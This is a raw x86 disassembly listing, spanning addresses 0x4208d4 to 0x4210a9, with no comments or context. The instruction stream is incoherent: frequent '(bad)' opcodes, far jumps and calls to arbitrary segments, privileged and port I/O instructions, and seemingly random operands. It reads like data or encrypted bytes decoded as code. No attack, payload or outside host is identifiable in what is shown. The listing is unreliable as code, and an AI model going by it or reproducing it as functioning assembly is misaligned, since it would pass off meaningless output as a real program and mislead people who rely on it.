  4208d4:	add    eax,0x3840f3f1
  4208d9:	daa    
  4208da:	push   es
  4208db:	ss xchg ah,dl
  4208de:	pop    eax
  4208df:	shl    DWORD PTR [edi],cl
  4208e1:	jmp    0x24225afb
  4208e6:	fwait
  4208e7:	in     al,dx
  4208e8:	or     eax,0x65e34384
  4208ed:	mov    ah,0x47
  4208ef:	enter  0x1d92,0x2d
  4208f3:	inc    edi
  4208f4:	mov    ebx,0x4fe7c8ca
  4208f9:	iret   
  4208fa:	jns    0x420940
  4208fc:	cli    
  4208fd:	cmp    esp,ebx
  4208ff:	sub    DWORD PTR [edi-0x28e55dd9],0xc
  420906:	mov    bl,0xbb
  420908:	xchg   esi,eax
  420909:	push   eax
  42090a:	outs   dx,BYTE PTR ds:[esi]
  42090b:	ds aam 0xfe
  42090e:	rcl    BYTE PTR [ecx+0x88dabdf],1
  420914:	xchg   esi,eax
  420915:	lahf   
  420916:	inc    esi
  420917:	je     0x42097a
  420919:	jp     0x4208ce
  42091b:	mov    ecx,0xd7eff71d
  420920:	rol    BYTE PTR [ecx+0x707bdf1f],cl
  420926:	xchg   ebp,eax
  420927:	out    0xc6,eax
  420929:	push   ds
  42092a:	sub    DWORD PTR [esi-0x13fceb4b],0x6b242b64
  420934:	pop    edi
  420935:	not    BYTE PTR ds:0x8bef153c
  42093b:	adc    al,0x5f
  42093d:	ret    
  42093e:	test   DWORD PTR fs:[esi-0x4],ebp
  420942:	std    
  420943:	inc    eax
  420944:	cmc    
  420945:	test   DWORD PTR [edi-0x45],0x3261ff40
  42094c:	dec    ecx
  42094d:	into   
  42094e:	sbb    al,0x35
  420950:	repnz mov dl,BYTE PTR [edi]
  420953:	ss mov edx,0x2ad27476
  420959:	cwde   
  42095a:	jns    0x420915
  42095c:	inc    edi
  42095d:	int    0x7
  42095f:	xchg   esi,eax
  420960:	mov    DWORD PTR [ebx],ebx
  420962:	lock xchg ecx,eax
  420964:	mov    ds:0x65a96ec7,eax
  420969:	add    ah,ch
  42096b:	mov    dl,0x97
  42096d:	mov    fs,WORD PTR [ebp-0x20303b4d]
  420973:	enter  0xaaec,0x37
  420977:	mov    DWORD PTR [edi+0x17a099df],edi
  42097d:	push   ebp
  42097e:	cmp    edi,DWORD PTR [edi]
  420980:	xchg   edx,eax
  420981:	shl    DWORD PTR [eax-0x310ac368],0x91
  420988:	add    eax,0xfb8e78d3
  42098d:	jmp    0x1bbe772e
  420992:	int    0x7b
  420994:	dec    eax
  420995:	add    al,0xd1
  420997:	mov    bl,0xb7
  420999:	ret    
  42099a:	jmp    0xa3d2c372
  42099f:	das    
  4209a0:	sbb    bh,al
  4209a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209a3:	stc    
  4209a4:	mov    ecx,DWORD PTR [ebp-0xde4e97]
  4209aa:	leave  
  4209ab:	jae    0x42099d
  4209ad:	jno    0x420a21
  4209af:	cmp    DWORD PTR [ecx+0x56],ecx
  4209b2:	and    ebp,DWORD PTR [ebx-0x67]
  4209b5:	fs mov edi,0x55fa4564
  4209bb:	scas   al,BYTE PTR es:[edi]
  4209bc:	int3   
  4209bd:	jno    0x420957
  4209bf:	popa   
  4209c0:	imul   edi,DWORD PTR ss:[eax-0x18031fff],0xbfb9b74d
  4209cb:	pop    ecx
  4209cc:	test   DWORD PTR [edx],esi
  4209ce:	adc    eax,0x47eac661
  4209d3:	dec    edx
  4209d4:	lds    esp,FWORD PTR [ecx-0x48b4ff39]
  4209da:	push   esi
  4209db:	fs xor esi,0xfffffff8
  4209df:	fwait
  4209e0:	ja     0x420990
  4209e2:	iret   
  4209e3:	jmp    0x16c9:0xc58f261f
  4209ea:	dec    edx
  4209eb:	or     BYTE PTR [edi-0x4f4e9e08],bh
  4209f1:	idiv   DWORD PTR [ecx-0x4f]
  4209f4:	imul   eax,DWORD PTR [ecx-0x5f],0xffffff8b
  4209f8:	shl    BYTE PTR [ebp-0x44],0x73
  4209fc:	push   ds
  4209fd:	add    al,0x2a
  4209ff:	push   ebp
  420a00:	(bad)  
  420a01:	cmc    
  420a02:	shl    BYTE PTR [ebx+0x23c21c8b],cl
  420a08:	push   eax
  420a09:	xor    eax,0x11be5db5
  420a0e:	arpl   WORD PTR [edx-0x53],ax
  420a11:	(bad)  
  420a13:	cmp    edx,DWORD PTR [ebp+0x4d]
  420a16:	pop    edi
  420a17:	inc    edx
  420a18:	sub    DWORD PTR [eax+0x257bf3aa],ebp
  420a1e:	adc    eax,0xd63d014d
  420a23:	xor    esp,eax
  420a25:	jmp    0x4209c2
  420a27:	and    DWORD PTR [esi-0x2e8a7656],0x918248a3
  420a31:	pop    edx
  420a32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a33:	ret    
  420a34:	mov    ecx,0x9440b7
  420a39:	bound  eax,QWORD PTR [edi]
  420a3b:	or     DWORD PTR ds:0xd688731b,eax
  420a41:	or     eax,0x93455656
  420a46:	sbb    ebx,DWORD PTR ds:0x3e7f23ca
  420a4c:	push   cs
  420a4d:	xchg   esp,eax
  420a4e:	int3   
  420a4f:	adc    eax,0x28a22bed
  420a54:	lahf   
  420a55:	jl     0x420a44
  420a57:	sub    BYTE PTR [ebx+eax*2-0x70],ch
  420a5b:	scas   al,BYTE PTR es:[edi]
  420a5c:	adc    BYTE PTR [eax+0x1df5099f],dh
  420a62:	(bad)  
  420a64:	mov    bh,0x49
  420a66:	mov    dh,BYTE PTR [eax-0x80]
  420a69:	ins    BYTE PTR es:[edi],dx
  420a6a:	jne    0x420ac5
  420a6c:	inc    edi
  420a6d:	push   eax
  420a6e:	rol    ah,cl
  420a70:	push   ebx
  420a71:	xor    DWORD PTR [ebp-0x75e2205d],ebp
  420a77:	adc    eax,0x2ccea1d6
  420a7c:	push   ss
  420a7d:	lahf   
  420a7e:	inc    esp
  420a80:	push   ds
  420a81:	js     0x420a8f
  420a83:	pushf  
  420a84:	(bad)  
  420a86:	xchg   edx,eax
  420a87:	ds popfw 
  420a8a:	xor    eax,0x6e448551
  420a8f:	add    eax,0x23bfad2
  420a94:	or     BYTE PTR [ecx-0x60b725e],ch
  420a9a:	sti    
  420a9b:	or     al,0x6a
  420a9d:	adc    esp,DWORD PTR [esi+0x7ffeea57]
  420aa3:	or     edx,DWORD PTR [ebp-0x35]
  420aa6:	sbb    BYTE PTR [eax],dl
  420aa8:	fisub  DWORD PTR [esi+0x73]
  420aab:	or     eax,0x61d792a9
  420ab0:	dec    edi
  420ab1:	gs xchg ebx,eax
  420ab3:	lea    edx,[eax+0x2801632f]
  420ab9:	ja     0x420b39
  420abb:	xor    cl,BYTE PTR [eax+0x69]
  420abe:	mov    WORD PTR [eax],?
  420ac0:	and    ch,BYTE PTR [ebx]
  420ac2:	call   0xbe9bfd2a
  420ac7:	sbb    ebx,DWORD PTR [esp+ebx*2-0x1332c9a2]
  420ace:	cmp    dl,BYTE PTR [esi+0x7a]
  420ad1:	std    
  420ad2:	pop    ds
  420ad3:	add    al,0x17
  420ad5:	inc    esp
  420ad6:	(bad)  
  420ad7:	push   ebp
  420ad8:	ret    0x38d4
  420adb:	fild   QWORD PTR [esi-0x17]
  420ade:	mov    esp,0x4967c337
  420ae3:	sbb    ebx,esp
  420ae5:	sbb    BYTE PTR [ecx-0x74],0x53
  420ae9:	bound  eax,QWORD PTR [ebx-0x7ffea820]
  420aef:	xchg   ecx,eax
  420af0:	bound  esp,QWORD PTR [edi]
  420af2:	add    ch,bh
  420af4:	cmp    esi,esi
  420af6:	add    dl,BYTE PTR [ebx+0x51]
  420af9:	mov    ah,dh
  420afb:	jno    0x420ad3
  420afd:	sbb    bh,BYTE PTR [edi+0x5b168ceb]
  420b03:	fs dec esi
  420b05:	scas   al,BYTE PTR es:[di]
  420b07:	sub    DWORD PTR [eax],ebx
  420b09:	lea    esp,[ebx-0x47]
  420b0c:	cmp    BYTE PTR [ecx+edx*4-0x5d],ah
  420b10:	jmp    0x420ab0
  420b12:	cmp    BYTE PTR [edi],cl
  420b14:	arpl   WORD PTR [edi-0x4d],bx
  420b17:	mov    dh,0xb7
  420b19:	or     BYTE PTR [ebx-0x1b],cl
  420b1c:	sbb    eax,DWORD PTR [eax-0x38fbf318]
  420b22:	mov    eax,0x4de5a22d
  420b27:	add    ch,BYTE PTR [edi+0x67b8b52b]
  420b2d:	(bad)  
  420b2e:	ffree  st(4)
  420b30:	mov    eax,ds:0xe1e19f5c
  420b35:	sub    eax,0x40f503b4
  420b3b:	ffree  st(3)
  420b3d:	mov    DWORD PTR [eax+eiz*1+0x75ab824],ecx
  420b44:	xchg   ebp,eax
  420b45:	push   esi
  420b47:	sub    DWORD PTR ds:0x9c7de70,0xffffffed
  420b4e:	pop    eax
  420b4f:	mov    esp,0x9e5ee80c
  420b54:	syscall 
  420b56:	xor    dl,0xe2
  420b59:	jecxz  0x420b62
  420b5b:	push   es
  420b5c:	pop    ebx
  420b5d:	lods   al,BYTE PTR ds:[esi]
  420b5e:	cli    
  420b5f:	cs mov ecx,ecx
  420b62:	loopne 0x420b4d
  420b64:	jmp    0x420b70
  420b66:	es out 0x89,al
  420b69:	add    eax,0xc8190ccc
  420b6e:	cmp    ebx,DWORD PTR [esi]
  420b70:	das    
  420b71:	fdivr  QWORD PTR [esi]
  420b73:	sbb    BYTE PTR ds:0xd654eb8e,dl
  420b79:	cmovs  ecx,DWORD PTR [ebx-0x23de7529]
  420b80:	inc    eax
  420b81:	sub    DWORD PTR [ecx+0x6c],esp
  420b84:	inc    edx
  420b85:	stc    
  420b86:	mov    al,0x46
  420b88:	mov    ecx,0xe6fc612b
  420b8d:	sub    eax,0xb3d534fe
  420b92:	fwait
  420b93:	or     dl,BYTE PTR [edx+0x4e]
  420b96:	pop    edi
  420b97:	lea    eax,[ebp-0x35]
  420b9a:	scas   al,BYTE PTR es:[edi]
  420b9b:	fs sub edi,eax
  420b9e:	ss mov esp,0x55dbeb05
  420ba4:	ret    
  420ba5:	sti    
  420ba6:	mov    ecx,0x3c12d59b
  420bab:	daa    
  420bac:	sar    BYTE PTR [ecx+0x2f],cl
  420baf:	call   DWORD PTR [eax+0x1420967b]
  420bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bb6:	push   eax
  420bb7:	sar    edi,1
  420bb9:	(bad)  
  420bba:	cmc    
  420bbb:	adc    cl,BYTE PTR [esi-0x7fe45da9]
  420bc1:	push   ebp
  420bc2:	stc    
  420bc3:	retf   0xe0e8
  420bc6:	lahf   
  420bc7:	pop    ecx
  420bc8:	sub    BYTE PTR [esi+0x354472da],cl
  420bce:	inc    esi
  420bcf:	fdivr  st,st(5)
  420bd1:	outs   dx,BYTE PTR ds:[esi]
  420bd2:	and    DWORD PTR [eax-0x55],esp
  420bd5:	xchg   DWORD PTR [edi-0x2b],eax
  420bd8:	test   BYTE PTR [esi],al
  420bda:	dec    ebp
  420bdb:	dec    esi
  420bdc:	imul   edi,edx,0x24e5b3c5
  420be2:	(bad)  
  420be3:	cdq    
  420be4:	(bad)  
  420be5:	in     al,0x28
  420be7:	fucomip st,st(5)
  420be9:	mov    ds:0xcbaa3489,eax
  420bee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bef:	(bad)  
  420bf0:	gs xchg ebp,eax
  420bf2:	pop    ecx
  420bf3:	cmp    BYTE PTR [eax-0x5],cl
  420bf6:	dec    esp
  420bf7:	and    ebx,0x746c3ee
  420bfd:	jbe    0x420c3c
  420bff:	xor    ebx,ebp
  420c01:	test   BYTE PTR [eax],dh
  420c03:	clc    
  420c04:	shl    DWORD PTR [eax],cl
  420c06:	stc    
  420c07:	mov    cl,ch
  420c09:	scas   eax,DWORD PTR es:[edi]
  420c0a:	call   0x417fe037
  420c0f:	pop    edx
  420c10:	rcl    DWORD PTR [ebp-0x39],0x5e
  420c14:	ret    0x5d39
  420c17:	leave  
  420c18:	imul   ebp,ebx,0xffffff9d
  420c1b:	rcl    al,cl
  420c1d:	or     BYTE PTR [eax+0x3b],al
  420c20:	into   
  420c21:	mov    ah,0x30
  420c23:	cmp    eax,0xbc124d88
  420c28:	mov    edx,0xf9ce9489
  420c2d:	test   al,0x12
  420c2f:	ret    0x1194
  420c32:	or     BYTE PTR [edi+0x5a8beb1d],bl
  420c38:	cmp    ecx,ebp
  420c3a:	cvtpi2ps xmm0,QWORD PTR [ecx]
  420c3d:	mov    edx,0x5d28a7e0
  420c42:	lahf   
  420c43:	sub    BYTE PTR [ebx-0x41c9bbee],0x85
  420c4a:	sti    
  420c4b:	out    dx,al
  420c4c:	js     0x420be1
  420c4e:	or     ch,BYTE PTR [edi-0x6]
  420c51:	jecxz  0x420c4a
  420c53:	add    ah,bh
  420c55:	push   ds
  420c56:	stc    
  420c57:	mov    al,0xb6
  420c59:	and    WORD PTR [edx],ax
  420c5c:	sub    ebx,DWORD PTR [edi-0x72]
  420c5f:	push   ebp
  420c60:	ds out dx,eax
  420c62:	shl    DWORD PTR [ebp-0x1e],cl
  420c65:	push   ebx
  420c66:	jno    0x420ca5
  420c68:	jnp    0x420c89
  420c6a:	adc    al,BYTE PTR [edi+0x7e]
  420c6d:	adc    al,0x1d
  420c6f:	ja     0x420c33
  420c71:	(bad)  
  420c72:	push   ecx
  420c73:	jmp    FWORD PTR [ebx-0x68]
  420c76:	test   BYTE PTR [ebx],dh
  420c78:	dec    esp
  420c79:	(bad)  
  420c7a:	loopne 0x420c9e
  420c7c:	iret   
  420c7d:	push   eax
  420c7e:	out    0xeb,al
  420c80:	sbb    eax,0x61ccd233
  420c85:	or     esi,ecx
  420c87:	jo     0x420c42
  420c89:	or     ch,ch
  420c8b:	test   DWORD PTR [eax-0x38],edi
  420c8e:	mov    esp,0x1f20cd35
  420c93:	call   0x81b2:0x6ac9f3c
  420c9a:	dec    edx
  420c9b:	inc    edx
  420c9c:	mov    ah,0xaa
  420c9e:	adc    eax,DWORD PTR [eax]
  420ca0:	jmp    0x7b5f:0xc694e264
  420ca7:	dec    esi
  420ca8:	pushf  
  420ca9:	cs and al,0xcb
  420cac:	pusha  
  420cad:	test   eax,0xd3b4733a
  420cb2:	cld    
  420cb3:	int3   
  420cb4:	push   ds
  420cb5:	push   eax
  420cb6:	push   esp
  420cb7:	jnp    0x420c77
  420cb9:	fcmovnu st,st(7)
  420cbb:	ror    esi,1
  420cbd:	fstp   DWORD PTR [ebp+0x45]
  420cc0:	adc    ebx,DWORD PTR [ecx+0x4023900d]
  420cc6:	in     eax,0x3f
  420cc8:	leave  
  420cc9:	dec    edi
  420cca:	iret   
  420ccb:	fadd   DWORD PTR [esi+0x55]
  420cce:	or     al,0x94
  420cd0:	sti    
  420cd1:	jmp    0x2c89:0x280df191
  420cd8:	jne    0x420c71
  420cda:	out    dx,al
  420cdb:	adc    eax,0x56cce4b7
  420ce0:	ins    BYTE PTR es:[edi],dx
  420ce1:	fisttp QWORD PTR [edx]
  420ce3:	push   es
  420ce4:	cli    
  420ce5:	jg     0x420c80
  420ce7:	in     eax,dx
  420ce8:	fs jmp 0xaeda:0xf4731982
  420cf0:	mov    esp,0xf75aac35
  420cf5:	cmp    bl,BYTE PTR ds:0x86176be5
  420cfb:	mov    ebp,0xf74a7dcd
  420d00:	dec    esi
  420d01:	cmp    BYTE PTR ds:0xd3b0c4f0,ch
  420d07:	dec    ecx
  420d08:	pop    ss
  420d09:	cwde   
  420d0a:	or     BYTE PTR [eax-0x14],ah
  420d0d:	mov    ebp,0xf8ce778a
  420d12:	in     al,dx
  420d13:	outs   dx,DWORD PTR ds:[esi]
  420d14:	sub    eax,0xac4daad3
  420d19:	loopne 0x420cc1
  420d1b:	or     al,0x1f
  420d1d:	sub    ebx,DWORD PTR [esi+0x1cc178b6]
  420d23:	mov    bh,0xa6
  420d25:	hlt    
  420d26:	es xchg edx,eax
  420d28:	mov    ah,0x1a
  420d2a:	in     eax,0xdb
  420d2c:	jp     0x420d7d
  420d2e:	dec    eax
  420d2f:	sub    al,0xb6
  420d31:	push   edx
  420d32:	out    0x1c,eax
  420d34:	in     eax,0xce
  420d36:	cwde   
  420d37:	clc    
  420d38:	int    0x3e
  420d3a:	stos   DWORD PTR es:[edi],eax
  420d3b:	retf   0xa89a
  420d3e:	xor    esp,eax
  420d40:	mov    esi,0xbe1a48fc
  420d45:	or     eax,0x5afe2f2
  420d4a:	mov    BYTE PTR [edx-0x1f],0x70
  420d4e:	mov    ebp,0x6a792831
  420d53:	add    eax,DWORD PTR [edi]
  420d55:	jno    0x420d60
  420d57:	inc    esp
  420d58:	(bad)  
  420d59:	es push ss
  420d5b:	fst    QWORD PTR [edi]
  420d5d:	jb     0x420ceb
  420d5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d60:	shr    DWORD PTR [eax+ebx*2],0x4
  420d64:	and    ah,BYTE PTR [eax]
  420d66:	dec    BYTE PTR ds:0x973a6d36
  420d6c:	or     ebp,DWORD PTR ds:[ecx-0x70]
  420d70:	inc    edx
  420d71:	outs   dx,BYTE PTR ds:[esi]
  420d72:	cmp    DWORD PTR [ebx-0x2a],esp
  420d75:	mov    bl,BYTE PTR [ebx+edi*8+0x4a]
  420d79:	adc    eax,0x767f59b
  420d7e:	(bad)  
  420d7f:	popa   
  420d80:	fisub  DWORD PTR [edi-0x6c]
  420d83:	adc    al,0x41
  420d85:	mov    al,BYTE PTR [edx+ebp*1-0x48977d1e]
  420d8c:	inc    ecx
  420d8d:	inc    esi
  420d8e:	in     al,0x99
  420d90:	es xor al,0x80
  420d93:	xchg   DWORD PTR [ebx+0x31858b3e],ecx
  420d99:	nop
  420d9a:	sbb    ebx,DWORD PTR [ecx+0x7]
  420d9d:	push   ds
  420d9e:	mov    cs,WORD PTR [ecx+edi*4+0x66]
  420da2:	xchg   esp,eax
  420da3:	enter  0x2022,0xc5
  420da7:	and    BYTE PTR [eax],0x9d
  420daa:	mov    ds:0x13eb8499,eax
  420daf:	xchg   DWORD PTR [esi-0x3bb2b923],ecx
  420db5:	mov    dh,0x8d
  420db7:	jg     0x420d66
  420db9:	in     eax,0xc7
  420dbb:	sbb    eax,0x37b9e8ff
  420dc0:	int    0x3d
  420dc2:	push   ds
  420dc3:	call   0x2fe7:0x15950c4
  420dca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420dcb:	pop    ebp
  420dcc:	xchg   edi,eax
  420dcd:	fsubr  st(2),st
  420dcf:	add    ebp,DWORD PTR [esi]
  420dd1:	xor    al,0x3
  420dd3:	adc    al,0xa8
  420dd5:	call   0x1872:0x59a2b843
  420ddc:	and    edi,DWORD PTR [ecx-0x12d7a4ce]
  420de2:	mov    es,WORD PTR [ebx-0x61]
  420de5:	dec    esp
  420de6:	fsub   QWORD PTR [esi+0x4d]
  420de9:	jo     0x420e5b
  420deb:	in     al,dx
  420dec:	mov    bl,0xd6
  420dee:	mov    eax,0xd095bfe1
  420df3:	(bad)  
  420df4:	mov    ebx,0x6669cbf9
  420df9:	xor    ch,BYTE PTR [ebx+0x39801153]
  420dff:	es mov ecx,0x866a040d
  420e05:	sbb    BYTE PTR [eax],dh
  420e07:	(bad)  
  420e08:	ret    
  420e09:	mov    al,0xa
  420e0b:	or     dh,dh
  420e0d:	loopne 0x420e4c
  420e0f:	icebp  
  420e10:	les    eax,FWORD PTR fs:[edi+0x2b]
  420e14:	sbb    dh,dh
  420e16:	ins    DWORD PTR es:[edi],dx
  420e17:	mov    ecx,0x24576f15
  420e1c:	lods   al,BYTE PTR ds:[esi]
  420e1d:	lock jbe 0x420e57
  420e20:	mov    bh,0xdb
  420e22:	adc    ah,dh
  420e24:	sahf   
  420e25:	push   es
  420e26:	mov    dl,0xfc
  420e28:	mov    dh,0x77
  420e2a:	mov    DWORD PTR [ebp+0x61],edi
  420e2d:	lds    ecx,FWORD PTR [ecx]
  420e2f:	xchg   ebp,eax
  420e30:	and    ah,ah
  420e32:	aaa    
  420e33:	pop    esp
  420e34:	mov    ?,esp
  420e36:	or     esp,DWORD PTR [ebx-0x31]
  420e39:	jbe    0x420e71
  420e3b:	mov    es,WORD PTR [eax+0x3dbdf5fd]
  420e41:	and    bh,BYTE PTR [eax+edx*2-0x5c60b870]
  420e48:	sbb    DWORD PTR [edx-0xa],esp
  420e4b:	push   0xffffffd1
  420e4d:	pusha  
  420e4e:	xchg   edi,eax
  420e4f:	jne    0x420de4
  420e51:	dec    ecx
  420e52:	xchg   esp,eax
  420e53:	rol    BYTE PTR [eax+eiz*2+0x32709352],1
  420e5a:	push   esp
  420e5b:	mov    cl,ah
  420e5d:	cmc    
  420e5e:	cdq    
  420e5f:	out    0xd8,al
  420e61:	jp     0x420ec2
  420e63:	sbb    esp,DWORD PTR [ebx+0x1f]
  420e66:	jae    0x420e53
  420e68:	dec    eax
  420e69:	pop    ecx
  420e6a:	sbb    DWORD PTR [ecx-0x17a249e1],edi
  420e70:	or     al,0x88
  420e72:	add    esi,0xffffffd7
  420e75:	mov    ds:0xb289fe42,eax
  420e7a:	sbb    BYTE PTR [ebx],0xa3
  420e7d:	xchg   edx,eax
  420e7e:	and    esp,ecx
  420e80:	mov    ch,0x3
  420e82:	jne    0x420e73
  420e84:	and    ah,cl
  420e86:	cmp    eax,0x5d78bc4c
  420e8b:	std    
  420e8c:	sbb    al,0x41
  420e8e:	ror    BYTE PTR [ecx],1
  420e90:	push   ss
  420e91:	mov    edi,DWORD PTR [esp+edx*1]
  420e94:	clc    
  420e95:	push   0xa
  420e97:	pop    ds
  420e98:	jge    0x420eeb
  420e9a:	pop    edx
  420e9b:	pop    ebp
  420e9c:	dec    ecx
  420e9d:	popf   
  420e9e:	fwait
  420e9f:	dec    edi
  420ea0:	(bad)  
  420ea2:	sahf   
  420ea3:	xor    DWORD PTR [esi-0x5d401aa5],esp
  420ea9:	scas   al,BYTE PTR es:[edi]
  420eaa:	xchg   edi,eax
  420eab:	and    ah,BYTE PTR [eax-0x7f775e32]
  420eb1:	mov    al,ds:0xe9e91cbb
  420eb6:	hlt    
  420eb7:	xor    bh,BYTE PTR [ebx]
  420eb9:	mov    cl,0xf1
  420ebb:	scas   al,BYTE PTR es:[edi]
  420ebc:	mov    ebx,cr3
  420ebf:	jmp    0x420e8c
  420ec1:	mov    ecx,0x26fe57c5
  420ec6:	cmp    eax,0x24a75ce
  420ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ecc:	repz dec cx
  420ecf:	xchg   ebp,eax
  420ed0:	push   eax
  420ed1:	or     BYTE PTR [esi],ah
  420ed3:	mov    bh,0xd0
  420ed5:	pop    es
  420ed6:	mul    DWORD PTR [eax-0x18]
  420ed9:	into   
  420eda:	fs (bad) 
  420edc:	pusha  
  420edd:	or     bl,BYTE PTR [esi+edi*4+0x7c505026]
  420ee4:	repz test al,0xc7
  420ee7:	loop   0x420f43
  420ee9:	rcl    ch,cl
  420eeb:	ret    0xfd6f
  420eee:	inc    ecx
  420eef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ef0:	jl     0x420f07
  420ef2:	(bad)  
  420ef3:	dec    ecx
  420ef4:	sbb    DWORD PTR [edx],edi
  420ef6:	add    esi,ecx
  420ef8:	pop    esi
  420ef9:	mov    ebp,0xdb8fa563
  420efe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420eff:	mov    bl,0xb
  420f01:	lock dec edx
  420f03:	jbe    0x420f5e
  420f05:	out    0x62,eax
  420f07:	mov    edx,0x57c07aea
  420f0c:	mov    bl,0xde
  420f0e:	leave  
  420f0f:	call   0x6e0f:0xc7c42a95
  420f16:	or     eax,0x29470181
  420f1b:	adc    BYTE PTR [edi+0xc0bbf05],0x60
  420f22:	cmp    al,0x69
  420f24:	pop    ecx
  420f25:	pop    ecx
  420f26:	jmp    0x420f81
  420f28:	pop    eax
  420f29:	or     DWORD PTR [ecx],edx
  420f2b:	inc    edx
  420f2c:	pop    ebp
  420f2d:	adc    eax,DWORD PTR [esi+0x56]
  420f30:	sbb    DWORD PTR [esi],edx
  420f32:	gs or  dh,bh
  420f35:	clc    
  420f36:	jmp    0x420ede
  420f38:	stos   BYTE PTR es:[edi],al
  420f39:	push   0x17b1fe60
  420f3e:	lahf   
  420f3f:	jp     0x420f2c
  420f41:	arpl   WORD PTR ds:0xac7fc37,si
  420f47:	cld    
  420f48:	sub    DWORD PTR [esi+0x72],esi
  420f4b:	aam    0x33
  420f4d:	sub    eax,0xcdf4ed43
  420f52:	cmp    eax,DWORD PTR [edi]
  420f54:	add    cl,BYTE PTR [edi]
  420f56:	pop    esp
  420f57:	arpl   WORD PTR [ecx+0x62b19f17],di
  420f5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f5e:	or     DWORD PTR [edx-0x2e],edi
  420f61:	leave  
  420f62:	sub    dl,ah
  420f64:	jmp    0x420f56
  420f66:	test   eax,0xdd5df575
  420f6b:	das    
  420f6c:	mov    al,ds:0x15577ef0
  420f71:	dec    edx
  420f72:	pop    ss
  420f73:	jmp    0x57d0:0xa9de8e10
  420f7a:	xor    DWORD PTR [ebx],ebx
  420f7c:	xlat   BYTE PTR ds:[ebx]
  420f7d:	test   al,0xb4
  420f7f:	outs   dx,DWORD PTR ds:[esi]
  420f80:	cwde   
  420f81:	lahf   
  420f82:	and    ebp,esp
  420f84:	not    DWORD PTR [edx+0x3f8b90e1]
  420f8a:	cmp    dh,BYTE PTR [edi]
  420f8c:	scas   al,BYTE PTR es:[edi]
  420f8d:	test   al,0x1
  420f8f:	mov    al,0xf7
  420f91:	imul   edi,DWORD PTR [eax+0x72be63fe],0xfffffff0
  420f98:	mov    dh,0x43
  420f9a:	outs   dx,BYTE PTR ds:[esi]
  420f9b:	dec    ebx
  420f9c:	cmp    edi,DWORD PTR [edx-0x44]
  420f9f:	and    eax,0x72f9a314
  420fa4:	xor    al,0x9e
  420fa6:	cdq    
  420fa7:	sbb    al,0xc0
  420fa9:	cwde   
  420faa:	fidiv  DWORD PTR [eax+0x56]
  420fad:	shr    bl,0x7b
  420fb0:	cmp    eax,0x7a1e837a
  420fb5:	jmp    0x420fc5
  420fb7:	repnz (bad) 
  420fb9:	pop    esp
  420fba:	aaa    
  420fbb:	or     bl,BYTE PTR [eax+0x78f02bef]
  420fc1:	jns    0x420f65
  420fc3:	fisub  DWORD PTR [esi-0x37]
  420fc6:	push   eax
  420fc7:	inc    ebx
  420fc8:	jmp    0x4097d457
  420fcd:	sbb    cl,BYTE PTR ds:0x8777fe0b
  420fd3:	pop    edi
  420fd4:	rol    ebp,cl
  420fd6:	int3   
  420fd7:	mov    WORD PTR [ebp+0x4f],?
  420fda:	mov    edx,0x87f58833
  420fdf:	jne    0x421006
  420fe1:	fwait
  420fe2:	push   ebx
  420fe3:	jle    0x420fef
  420fe5:	hlt    
  420fe6:	popf   
  420fe7:	das    
  420fe8:	xchg   DWORD PTR cs:[esi+0x37],ebx
  420fec:	xlat   BYTE PTR ds:[ebx]
  420fed:	adc    esi,DWORD PTR [esi-0x27427ce7]
  420ff3:	push   edx
  420ff4:	pusha  
  420ff5:	in     al,dx
  420ff6:	dec    esp
  420ff7:	cdq    
  420ff8:	mov    esp,0x7c467910
  420ffd:	push   ds
  420ffe:	test   al,0xd
  421000:	ss mov ch,0xf9
  421003:	sbb    BYTE PTR [edx+0x10],dh
  421006:	aas    
  421007:	pop    esi
  421008:	test   al,0x61
  42100a:	fmul   QWORD PTR [edi+0xd]
  42100d:	dec    edx
  42100e:	fs add eax,0x8c1dcc8a
  421014:	(bad)  
  421015:	pop    esi
  421016:	sub    esi,DWORD PTR [esi+0x1ae51305]
  42101c:	scas   eax,DWORD PTR es:[edi]
  42101d:	dec    DWORD PTR [ebx+0xa]
  421020:	xor    al,BYTE PTR [esi+0x70a25622]
  421026:	(bad)  
  421027:	in     al,dx
  421028:	les    bp,DWORD PTR [esi-0x16]
  42102c:	mov    al,ds:0xcd46ea12
  421031:	xchg   edx,eax
  421032:	inc    eax
  421033:	and    bl,BYTE PTR ds:0xf4f2049c
  421039:	lea    eax,[esi-0x3a]
  42103c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42103d:	sbb    al,0x2c
  42103f:	jl     0x421041
  421041:	aad    0x8e
  421043:	out    dx,eax
  421044:	outs   dx,DWORD PTR ds:[esi]
  421045:	cmp    BYTE PTR [edi+0x4015ebe2],bh
  42104b:	pop    ds
  42104c:	inc    ebp
  42104d:	xor    cl,BYTE PTR [edi-0x772cc55c]
  421053:	xchg   esi,eax
  421054:	adc    dl,BYTE PTR [ebx]
  421056:	xchg   ebp,eax
  421057:	adc    eax,0x28068ac9
  42105c:	inc    ebx
  42105d:	out    0x77,eax
  42105f:	mov    ds:0x3619b060,al
  421064:	outs   dx,DWORD PTR ds:[esi]
  421065:	xchg   edi,eax
  421066:	mov    bh,ah
  421068:	mov    al,0x78
  42106a:	pop    esi
  42106b:	int    0x9b
  42106d:	lods   eax,DWORD PTR ds:[esi]
  42106e:	(bad)  
  42106f:	mov    bl,0xb7
  421071:	aaa    
  421072:	call   FWORD PTR [ebx-0x64418884]
  421078:	xchg   BYTE PTR [edi],ah
  42107a:	mov    esi,0x1ee847e9
  42107f:	jge    0x421047
  421081:	scas   al,BYTE PTR es:[edi]
  421082:	arpl   WORD PTR [ebx+edx*1-0x72140553],si
  421089:	adc    ch,BYTE PTR [ecx]
  42108b:	loop   0x421035
  42108d:	jbe    0x421046
  42108f:	jle    0x421028
  421091:	add    ebx,ebp
  421093:	call   0x9c8d48b
  421098:	cli    
  421099:	mov    dh,0xb8
  42109b:	ds call 0xaeac:0x87f6b857
  4210a3:	retf   
  4210a4:	mov    dl,0x60
  4210a6:	inc    esp
  4210a7:	inc    esi
  4210a8:	push   ebp
  4210a9:	inc    esi
